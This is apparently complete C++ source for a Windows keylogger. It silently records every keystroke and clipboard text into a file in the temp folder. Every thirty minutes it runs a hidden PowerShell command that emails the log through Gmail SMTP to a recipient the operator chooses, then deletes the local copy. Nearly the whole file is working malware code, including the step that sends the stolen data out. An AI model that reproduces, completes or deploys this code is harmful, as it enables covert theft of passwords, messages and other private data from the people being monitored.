#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <strsafe.h>
#include <Lmcons.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>

using namespace std;


void LOG(string input) {
	fstream LogFile;
	LogFile.open("data.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
	switch (S_Key) {

		////////////////////////////
		////		MISC		////
		////////////////////////////
	case VK_SPACE:

		LOG(" ");
		return true;

	case VK_RETURN:

		LOG("[ENTER]\n");
		return true;

	case 190:

		LOG(".");
		return true;

		////////////////////////////
		////		SHIFT		////
		////////////////////////////

	case VK_SHIFT:

		LOG("[SHIFT]");
		return true;

	case 160:

		//LOG("\n[L_SHIFT]");
		return true;

	case 161:

		//LOG("\n[R_SHIFT]");
		return true;



	case VK_BACK:

		LOG("\n[BACKSPACE]");
		return true;

	case VK_RBUTTON:

		LOG("\n[R_CLICK]");
		return true;

	case VK_CAPITAL:

		LOG("\n[CAPS_LOCK]");
		return true;

	case VK_TAB:

		LOG("\n[TAB]");
		return true;



		////////////////////////////
		////	ARROW KEYS		////
		////////////////////////////

	case VK_UP:

		LOG("\n[UP_ARROW_KEY]");
		return true;

	case VK_DOWN:

		LOG("\n[DOWN_ARROW_KEY]");
		return true;

	case VK_LEFT:

		LOG("\n[LEFT_ARROW_KEY]");
		return true;

	case VK_RIGHT:

		LOG("\n[RIGHT_ARROW_KEY]");
		return true;


		////////////////////////////
		////		CTRL		////
		////////////////////////////

	case VK_CONTROL:	//CTRL IN GENERAL

		LOG("[CTRL]");
		return true;

	case 162:	//LEFT CTRL

		//LOG("\n[L_CTRL]\n");
		return true;

	case 163:	//RIGHT CTRL

		//LOG("\n[R_CTRL]\n");
		return true;


		////////////////////////////
		////		ALT			////
		////////////////////////////
	case VK_MENU:	//ALT IN GENERAL

		LOG("\n[ALT]");
		return true;

	case 164:	//LEFT ALT

		//LOG("\n[ALT]");
		return true;

	case 165:	//RIGHT ALT

		//LOG("\n[ALT]");
		return true;

		////////////////////////////
		////		MISC		////
		////////////////////////////

	case VK_PAUSE:

		LOG("\n[PAUSE]\n");
		return true;

	case VK_ESCAPE:

		LOG("\n[ESCAPE]");
		return true;

	case VK_CANCEL:

		LOG("\n[CANCEL]\n");
		return true;

	case VK_XBUTTON1:

		LOG("\n[XBUTTON1]\n");
		return true;

	case VK_XBUTTON2:

		LOG("\n[XBUTTON2]\n");
		return true;

	case VK_CLEAR:

		LOG("\n[CLEAR]\n");
		return true;


	case VK_KANA:

		LOG("\n[KANA]\n");
		return true;

	case VK_IME_ON:

		LOG("\n[IME_ON]\n");
		return true;

	case VK_JUNJA:

		LOG("\n[JUNJA]\n");
		return true;
		////////////////////////////
		////	WINDOWS BUTTON	////
		////////////////////////////

	case VK_LWIN:

		LOG("\n[LWIN]\n");
		return true;

	case VK_RWIN:

		LOG("\n[RWIN]\n");
		return true;



	case 93:	// CrSel //right click but for the keyboard i guess

		LOG("\n[CrSel]\n");
		return true;


	case 188:		//COMMA

		LOG(",");
		return true;



		////////////////////////////
		////		NUMPAD		////
		////////////////////////////

	case VK_NUMPAD0:

		LOG("\n[NUMPAD0]");
		return true;

	case VK_NUMPAD1:

		LOG("\n[NUMPAD1]");
		return true;

	case VK_NUMPAD2:

		LOG("\n[NUMPAD2]");
		return true;

	case VK_NUMPAD3:

		LOG("\n[NUMPAD3]");
		return true;

	case VK_NUMPAD4:

		LOG("\n[NUMPAD4]");
		return true;

	case VK_NUMPAD5:

		LOG("\n[NUMPAD5]");
		return true;

	case VK_NUMPAD6:

		LOG("\n[NUMPAD6]");
		return true;

	case VK_NUMPAD7:

		LOG("\n[NUMPAD7]");
		return true;

	case VK_NUMPAD8:

		LOG("\n[NUMPAD8]");
		return true;

	case VK_NUMPAD9:

		LOG("\n[NUMPAD9]");
		return true;


		////////////////////////////
		////		MISC		////
		////////////////////////////

	case VK_NUMLOCK:

		LOG("\n[NUMLOCK]");
		return true;

	case VK_HOME:

		LOG("\n[HOME]");
		return true;

	case VK_INSERT:

		LOG("\n[INSERT]");
		return true;

	case VK_DELETE:

		LOG("\n[DELETE]");
		return true;

	case VK_END:

		LOG("\n[END]");
		return true;

	case 33:

		LOG("\n[PAGE_UP]");
		return true;

	case 34:

		LOG("\n[PAGE_DOWN]");
		return true;

	case 44:

		LOG("\n[PRINT_SCREEN]");
		return true;

	case VK_SCROLL:

		LOG("\n[SCROLL_LOCK]");
		return true;

	case VK_OEM_1:		// ;  :

		LOG(";");
		return true;

	case VK_OEM_2:		// /  ?

		LOG("/");
		return true;

	case VK_OEM_3:		// `  ~

		LOG("`");
		return true;

	case VK_OEM_4:		// ;  :

		LOG("[");
		return true;

	case VK_OEM_5:		// ;  :

		LOG("\\");
		return true;

	case VK_OEM_6:		// ;  :

		LOG("]");
		return true;

	case VK_OEM_7:		// ;  :

		LOG("'");
		return true;

	case VK_OEM_8:		// ;  :

		LOG("[VK_OEM_8]");
		return true;


		////////////////////////////////////////////
		////	VIDEO / MUSIC PLAYER CONTROLS	////
		////////////////////////////////////////////

	case VK_PLAY:

		LOG("\n[PLAY]");
		return true;

	case 179:

		LOG("\n[START/PAUSE]");
		return true;

	case 176:

		LOG("\n[NEXT]");
		return true;

	case 177:

		LOG("\n[PREV]");
		return true;

	case 178:

		LOG("\n[STOP]");
		return true;

	case 173:

		LOG("\n[MUTE]");
		return true;

	case 174:

		LOG("\n[LOWER_VOL]");
		return true;

	case 175:

		LOG("\n[RAISE_VOL]");
		return true;

		////////////////////
		////	Math	////
		////////////////////

	case 107:

		LOG("+");
		return true;

	case 189:

		LOG("-");
		return true;

	case 187:

		LOG("=");
		return true;

	case 111:

		LOG("/");
		return true;

	case 106:

		LOG("*");
		return true;

	case 109:

		LOG("-");
		return true;

		////////////////////////////
		////		MISC		////
		////////////////////////////

	case VK_F1:

		LOG("\n[F1]");
		return true;

	case VK_F2:

		LOG("\n[F2]");
		return true;

	case VK_F3:

		LOG("\n[F3]");
		return true;

	case VK_F4:

		LOG("\n[F4]");
		return true;

	case VK_F5:

		LOG("\n[F5]");
		return true;

	case VK_F6:

		LOG("\n[F6]");
		return true;

	case VK_F7:

		LOG("\n[F7]");
		return true;

	case VK_F8:

		LOG("\n[F8]");
		return true;

	case VK_F9:

		LOG("\n[F9]");
		return true;

	case VK_F10:

		LOG("\n[F10]");
		return true;

	case VK_F11:

		LOG("\n[F11]");
		return true;

	case VK_F12:

		LOG("\n[F12]");
		return true;

	case VK_F13:

		LOG("\n[F13]");
		return true;

	case VK_F14:

		LOG("\n[F14]");
		return true;

	case VK_F15:

		LOG("\n[F15]");
		return true;

	case VK_F16:

		LOG("\n[F16]");
		return true;

	case VK_F17:

		LOG("\n[F17]");
		return true;

	case VK_F18:

		LOG("\n[F18]");
		return true;

	case VK_F19:

		LOG("\n[F19]");
		return true;

	case VK_F20:

		LOG("\n[F20]");
		return true;

	case VK_F21:

		LOG("\n[F21]");
		return true;

	case VK_F22:

		LOG("\n[F22]");
		return true;

	case VK_F23:

		LOG("\n[F23]");
		return true;

	case VK_F24:

		LOG("\n[F24]");
		return true;

	default:
		return false;
	}
}



int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(c), INT(d))
{
	// !NOTICE! - you need to allow less secure app access on your google account to allow it to send emails. Look up how to enable it.
	std::string email = "YOUR EMAIL";
	std::string emailPassword = "EMAIL PASSWORD";
	std::string recipientEmail = "EMAIL YOUR SENDING TO";

	//
	// Set Current Directory to %TEMP% or temporary folder
	//
	wstring TempPath;
	wchar_t wcharPath[MAX_PATH];
	if (GetTempPathW(MAX_PATH, wcharPath))
		TempPath = wcharPath;
	SetCurrentDirectory((LPCWSTR)TempPath.c_str());
	char KEY = 'x';

	//
	//	Get Current time
	//
	time_t now = time(0);
	tm* ltm = localtime(&now);

	//
	//	Get User Name
	//
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA(username, &username_len);

	//
	//	Header for txt file
	//

	LOG("\n\n==========================\n\tFEED START\n\t" + to_string(1 + ltm->tm_mon) + "/" + to_string(ltm->tm_mday) + "/" + to_string(1900 + ltm->tm_year) + "\n" + "\t" + to_string(ltm->tm_hour) + ":" + to_string(ltm->tm_min) + ":" + to_string(ltm->tm_sec) + "\n\t" + username + "\n" + "==========================\n");



	for (;;) {		//Main Loop

		time_t now = time(0);
		tm* ltm = localtime(&now);

		Sleep(5);
		for (int KEY = 8; KEY <= 255; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open("data.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
				else {

				}
			}
		}


		//
		//Send Email every 30 minutes
		//
		//				  VV--Minute Interval       V--Second Intervval
		if (ltm->tm_min % 30 == 0 && ltm->tm_sec == 0) {
			LOG("\n\n{Sending Email}\n\n" + to_string(ltm->tm_hour) + ":" + to_string(ltm->tm_min) + ":" + to_string(ltm->tm_sec));

			//Rename file to Month Day Year - Hour - Minute

			std::string dataFileName = "data_" + to_string(1 + ltm->tm_mon) + "_" + to_string(ltm->tm_mday) + "_" + to_string(1900 + ltm->tm_year) + "-" + to_string(ltm->tm_hour) + "-" + to_string(ltm->tm_min) + ".txt";
			if (rename("data.txt", dataFileName.c_str()) != 0)
				LOG("Error renaming file\n");
			else
				LOG("File successfully renamed.\n");

			std::string emailCommand = "powershell -command \"$message = new-object Net.Mail.MailMessage; $message.From = '" + email + "'; $message.To.Add('" + recipientEmail +"'); $message.Subject = 'Key Logger Activity from computer: ' + $env:UserName; $message.Body = 'ComputerName: ' + $env:ComputerName + ' | Username: ' + $env:UserName; $attachment = New-object Net.Mail.Attachment($env:TEMP + '\\" + dataFileName+ "'); $message.Attachments.Add($attachment); $smtp = new-object Net.Mail.SmtpClient('smtp.gmail.com', '587'); $smtp.EnableSSL = $true; $smtp.Credentials = New-object System.Net.NetworkCredential('" + email + "', '" + emailPassword + "'); $smtp.send($message); \"\n";

			WinExec(emailCommand.c_str(), SW_HIDE);
			Sleep(3000);

			if (remove(dataFileName.c_str()) != 0)
				LOG("Error deleting file");
			else
				LOG("File successfully deleted. And New File created.\nLocal Time:" + to_string(ltm->tm_hour) + ":" + to_string(ltm->tm_min) + ":" + to_string(ltm->tm_sec + 3 /* offset from sleep*/) + "\n\n");

		}


		//
		//Log Clipboard data every 30 seconds
		//
		if (ltm->tm_sec % 30 == 0) {


			OpenClipboard(0);

			char* cb = (char*)GetClipboardData(CF_TEXT);

			if (cb != NULL) {
				LOG("\nClipboard ->\t");
				LOG(cb);
				LOG("\t<- Clipboard\n");
				Sleep(1000);
			}
			CloseClipboard();
		}


	}

	return 0;
}